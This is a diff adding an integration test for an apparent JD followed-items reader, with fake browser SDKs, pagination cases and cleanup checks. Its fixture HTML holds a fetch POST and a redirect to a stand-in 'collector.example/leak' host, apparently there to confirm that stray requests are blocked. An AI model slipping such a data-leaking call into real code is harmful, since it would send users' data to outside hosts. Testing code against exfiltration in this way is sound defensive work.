@@ -261,6 +261,118 @@ class BrowserIntegrationTests(unittest.IsolatedAsyncioTestCase):
             server.server_close()
             thread.join()
 
+    async def test_followed_sdk_pagination_boundaries_and_cleanup(self):
+        """Exercise the actual query script with fake SDKs and a local HTTP fixture."""
+        from urllib.parse import parse_qs, urlparse
+        from test_followed import fixture
+        from jd_taobao_mcp.followed import follow_query_page, read_jd_followed
+        mode, total, fetched_pages = 'ok', 21, []
+        html = '''<script src="https://storage.360buyimg.com/redirect.js"></script>
+            <iframe src="https://cart.jd.com/cart_index"></iframe><script>
+            window.SHA256 = () => 'fake-hash';
+            window.ParamsSign = class { async sign() { return {h5st:'fake-signature'}; } };
+            window.getJsToken = callback => callback({jsToken:'fake-token'});
+            fetch('https://api.m.jd.com/api?functionId=pcCart_jc_follow',{method:'POST'}).catch(()=>{});
+            fetch('https://api.m.jd.com/api?functionId=cancelFollow').catch(()=>{});
+            fetch('https://collector.example/leak',{method:'POST'}).catch(()=>{});
+            </script>'''
+
+        class Handler(BaseHTTPRequestHandler):
+            def do_GET(self):
+                if self.path == '/redirect':
+                    self.send_response(302)
+                    self.send_header('Location', 'https://collector.example/leak')
+                    self.end_headers()
+                    return
+                self.send_response(200)
+                self.send_header('Access-Control-Allow-Origin', 'https://cart.jd.com')
+                self.send_header('Access-Control-Allow-Credentials', 'true')
+                self.send_header('Content-Type', 'text/html' if self.path == '/document' else 'application/json')
+                self.end_headers()
+                if self.path == '/document':
+                    body = html
+                else:
+                    number = int(parse_qs(urlparse(self.path).query)['page'][0])
+                    payload = fixture(1 if mode == 'duplicate' else number, total)
+                    if mode == 'error' and number == 2:
+                        payload = {'success': False}
+                    if mode == 'login':
+                        payload = {'code': -14}
+                    body = json.dumps(payload)
+                self.wfile.write(body.encode())
+
+            def log_message(self, *args):
+                pass
+
+        server = ThreadingHTTPServer(('127.0.0.1', 0), Handler)
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        original_fetch = Route.fetch
+
+        async def local_fetch(route, **kwargs):
+            self.assertEqual(kwargs['max_redirects'], 0)
+            request = route.request
+            if request.url == JD_CART_URL:
+                target = '/document'
+            elif request.url == 'https://storage.360buyimg.com/redirect.js':
+                target = '/redirect'
+            else:
+                number = follow_query_page(request.url)
+                self.assertIsNotNone(number, 'Unexpected network request reached the network')
+                fetched_pages.append(number)
+                target = f'/read?page={number}'
+            return await original_fetch(route, url=f'http://127.0.0.1:{server.server_port}{target}', **kwargs)
+
+        try:
+            before = len(self.browser.contexts)
+            await self.page.set_content('<title>Original page</title>')
+            with patch.object(Route, 'fetch', local_fetch):
+                result = await read_jd_followed(self.context, 50, 10000)
+                self.assertEqual(result['count'], 21, (result, fetched_pages))
+                self.assertEqual(fetched_pages, [1, 2, 3])
+                self.assertFalse(result['partial'])
+                self.assertTrue(result['coverage']['reached_end'])
+                self.assertIsNone(result['coverage']['account_list_complete'])
+                self.assertNotIn('FAKE_', json.dumps(result))
+                self.assertEqual(len(self.browser.contexts), before)
+                self.assertEqual(await self.page.title(), 'Original page')
+                result = await read_jd_followed(self.context, 3, 10000)
+                self.assertEqual(result['count'], 3)
+                self.assertTrue(result['partial'])
+                mode = 'error'
+                result = await read_jd_followed(self.context, 50, 10000)
+                self.assertEqual(result['count'], 20)
+                self.assertTrue(result['partial'])
+                mode = 'duplicate'
+                result = await read_jd_followed(self.context, 50, 10000)
+                self.assertEqual(result['count'], 20)
+                self.assertTrue(result['partial'])
+                mode = 'login'
+                result = await read_jd_followed(self.context, 50, 10000)
+                self.assertEqual(result['status'], 'login_required')
+                mode, total = 'ok', 100
+                result = await read_jd_followed(self.context, 100, 10000)
+                self.assertEqual(result['count'], 100)
+                self.assertEqual(result['pages_read'], 6)
+                self.assertFalse(result['partial'])
+                total = 101
+                result = await read_jd_followed(self.context, 100, 10000)
+                self.assertEqual(result['count'], 100)
+                self.assertTrue(result['partial'])
+                total = 0
+                result = await read_jd_followed(self.context, 50, 10000)
+                self.assertEqual(result['count'], 0)
+                self.assertTrue(result['success'])
+                self.assertFalse(result['partial'])
+                html = '<title>No SDK available</title>'
+                result = await read_jd_followed(self.context, 50, 200)
+                self.assertFalse(result['success'])
+                self.assertEqual(len(self.browser.contexts), before)
+        finally:
+            await asyncio.to_thread(server.shutdown)
+            server.server_close()
+            thread.join()
+
     async def test_login_page_exchanges_fragment_and_completes_human_flow(self):
         import socket
         import uvicorn
